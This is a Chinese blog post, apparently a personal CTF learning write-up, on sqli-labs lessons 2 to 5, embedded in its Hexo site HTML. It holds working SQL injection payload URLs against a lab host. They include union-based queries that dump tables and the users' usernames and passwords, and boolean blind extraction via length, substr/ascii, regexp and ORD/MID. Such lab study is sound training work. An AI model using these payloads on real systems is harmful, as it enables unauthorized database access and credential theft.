@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <title>sqli-labs 2-5 初识盲注 | W4rnIn9</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="sql注入,盲注,">
+  
+
+
+  
+    <meta name="description" content="网络安全爱好者 CTFer">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+  <script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+</head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JONER</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a href="/" target="_self">
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a href="/archives/" target="_self">
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path>
+          
+            <a href="javascript:void(0);" v-else>我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a href="https://github.com/joner11234" target="_blank">
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>sqli-labs 2-5 初识盲注</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2019-03-26
+    </span>
+    
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><blockquote>
+<p><a href="http://43.247.91.228:84/Less-2/" target="_blank" rel="noopener">地址</a></p>
+</blockquote>
+<p>在数字后加单引号报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</code></p>
+<p><strong>‘’ LIMIT 0,1’</strong>说明但单引号破坏了查询语句的平衡，可以推测出使用的是整数</p>
+<p><code>Select * from TABLE where id = (some integer value);</code></p>
+<p>所以对id没有任何处理，所以可以注入成功的有 <code>or 1=1</code> 或者<code>or 1=1 --+</code></p>
+<p>因此只需要将less1中的单引号去掉即可,同样使用<code>sqlmap</code>时，各项的命令的相同。</p>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><blockquote>
+<p><a href="http://43.247.91.228:84/Less-3/" target="_blank" rel="noopener">地址</a></p>
+</blockquote>
+<p>数字后加单引号</p>
+<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</code></p>
+<p><strong>‘’1’’) LIMIT 0,1’</strong>说明使用的是 <code>SELECT * FROMusers WHERE id=(&#39;$id&#39;) LIMIT 0,1</code>这种查询方式</p>
+<p>所以可以注入的有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;) or &apos;1&apos;=(&apos;1&apos;</span><br><span class="line">) or 1=1 --+</span><br></pre></td></tr></table></figure>
+<p>注入方式就是将less-1中的单引号改为 <code>&#39;)</code></p>
+<p>过程简单写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-3/?id=0 &apos;)  order by 3 --+    #查询列数</span><br><span class="line">http://43.247.91.228:84/Less-3/?id=0 &apos;)  union select 1,database(),version()  --+</span><br><span class="line"># 查询数据库版本和数据库名字</span><br><span class="line">http://43.247.91.228:84/Less-3/?id=0 &apos;)  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()  --+    #查询数据库的表</span><br><span class="line">http://43.247.91.228:84/Less-3/?id=0 &apos;)  union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;  --+   #查询users表中的列名</span><br><span class="line">http://43.247.91.228:84/Less-3/?id=0 &apos;)  union select 1,group_concat(id,&apos;-&apos;,username,&apos;-&apos;,password),3 from users --+ #爆出所有数据</span><br></pre></td></tr></table></figure>
+<p>使用<code>sqlmap</code>时，各项的命令的相同。</p>
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><blockquote>
+<p><a href="http://43.247.91.228:84/Less-4/?id=1" target="_blank" rel="noopener">地址</a></p>
+</blockquote>
+<p>数字后加单引号不报错，加双引号报错</p>
+<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</code></p>
+<p>根据<strong>‘“1””) LIMIT 0,1’</strong> 推测使用<code>&quot;) --+</code> 闭合和注释</p>
+<p>查询源码，使用的查询语句为</p>
+<p><code>$sql=&quot;SELECT * FROMusers WHERE id=(“$id”) LIMIT 0,1&quot;;</code></p>
+<p>将less-1中构造的注入语句中的单引号改为 <code>&quot;)</code>就可以</p>
+<p>使用<code>sqlmap</code>时，各项的命令的相同。</p>
+<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><blockquote>
+<p><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="noopener">地址</a></p>
+</blockquote>
+<p>这一关开始接触盲注，首先了解一下什么是盲注</p>
+<blockquote>
+<p>何为盲注？盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。从background-1中，我们可以知道盲注分为三类</p>
+<ul>
+<li>基于布尔SQL盲注</li>
+<li>基于时间的SQL盲注</li>
+<li>基于报错的SQL盲注</li>
+</ul>
+</blockquote>
+<p>这一关中当数据库命令执行出错时，只返回 <code>you are in....</code></p>
+<p><code>http://43.247.91.228:84/Less-5/?id=0</code>页面不正常，未出现<code>you are in ...</code></p>
+<p>加上单引号 <code>http://43.247.91.228:84/Less-5/?id=0 &#39; or 1=1 --+</code> 恢复正常</p>
+<p>所以推测数据库查询语句和第一关一样 ,只要闭合单引号就可以</p>
+<p>使用<code>length()</code>函数会返回相应字段的长度</p>
+<p>构造语句查询数据库的长度</p>
+<p><code>http://43.247.91.228:84/Less-5/?id=1 &#39; and length(database())&gt;7  --+</code>不断增加后面的数字，直到页面出现变化，判定出数据库名字的长度为8</p>
+<p>下面开始猜每一位具体是什么</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-5/?id=1 &apos; and left(database(),1)&gt;&apos;a&apos;  --+正常    </span><br><span class="line"></span><br><span class="line">http://43.247.91.228:84/Less-5/?id=1 &apos; and left(database(),1)&lt;&apos;z&apos;  --+ 正常</span><br><span class="line">http://43.247.91.228:84/Less-5/?id=1 &apos; and left(database(),1)&lt;&apos;m&apos;  --+ 错误</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>这样猜下去就能得到每一位的值，但是太麻烦。可以用脚本判断，或者直接用sqlmap</p>
+<p>猜解名字还可以使用 substr() ascii()函数进行尝试，这里使用它们来获得security数据库下的表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-5/?id=1 &apos; and  ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))&gt;90 --+#页面正常</span><br><span class="line">http://43.247.91.228:84/Less-5/?id=1 &apos; and  ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))&gt;120 --+#异常</span><br><span class="line">http://43.247.91.228:84/Less-5/?id=1 &apos; and  ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))&gt;100 --+#正常</span><br><span class="line">http://43.247.91.228:84/Less-5/?id=1 &apos; and  ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))&lt;110 --+#正常</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+<p>这样使用二分法猜解下去，最后得到第一个值为 ‘e’，然后修改  limit 0,1),1,1) 中倒数第二个1的数值，来猜解第一个表名的每一位，修改 limit后面的那个0，来确定不同的表，这样依次猜解下去就得到了所有的表名。</p>
+<p>下面猜解列名，使用<code>regexp</code>正则表达式进行查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-5/?id=1 &apos; and  1=(select 1 from information_schema.columns where table_name=&apos;users&apos; and column_name regexp &apos;^username&apos; limit 0,1)  --+# 页面正常</span><br></pre></td></tr></table></figure>
+<p>同样，将<code>username</code>改成<code>password</code>和 <code>id</code>也对，这里可以使用正则表达式来猜解列名，这里只是说明原理，具体操作可以使用工具或者自己写脚本。</p>
+<blockquote>
+<p>MID()函数</p>
+<p>SQL MID() 函数用于得到一个字符串的一部分。这个函数被MySQL支持，但不被MS SQL Server和Oracle支持。在SQL Server， Oracle 数据库中，我们可以使用 SQL SUBSTRING函数或者 SQL SUBSTR函数作为替代。</p>
+</blockquote>
+<blockquote>
+<p>ORD() 函数</p>
+<p>ORD() 函数返回字符串第一个字符的 <a href="http://www.nowamagic.net/academy/tag/ASCII" target="_blank" rel="noopener">ASCII</a> 值。</p>
+<p>语法： ORD(string)</p>
+</blockquote>
+<p>接下来使用<code>mid()函数</code>和<code>ord()</code>函数来获得users表中的内容，获得username中的第一行的第一个字符，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-5/?id=1&apos; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68 --+</span><br></pre></td></tr></table></figure>
+<p>就使用这样的语句，修改相应的值，不断重复，最后就获得了所有的值。</p>
+<p>因为比较简单，这里使用sqlmap还是和之前一个样。</p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JONER <br>
+        
+        原文链接 : <a href>http://joner11234.github.io/article/cde68b77.html</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share" style="margin-top: -2rem" data-wechat-qrcode-title="<p>微信扫一扫</p>" data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>" data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter">
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async></script>
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/sql注入/">
+              #sql注入
+            </a>
+          </span>
+          
+          <span class="span--tag">
+            <a href="/tags/盲注/">
+              #盲注
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/article/51ef88ce.html" target="_self">通过sqli-labs学习sql注入</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/article/f865e8e3.html" target="_self">sqli-labs 6-7 布尔型盲注 延时注入</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "1NXTyN2WX8S3WVndpU432Q6j-gzGzoHsz",
+      appKey: "qKRwkiwKUs1Q6PynhoYXoF4t",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+   
+
+</div>
+
+
+      <footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <p class="site-info">
+    博客已运行<span id="time-to-now"></span><span class="my-face">👦</span>
+    <br>
+    
+  </p>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2019, 3, 2).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
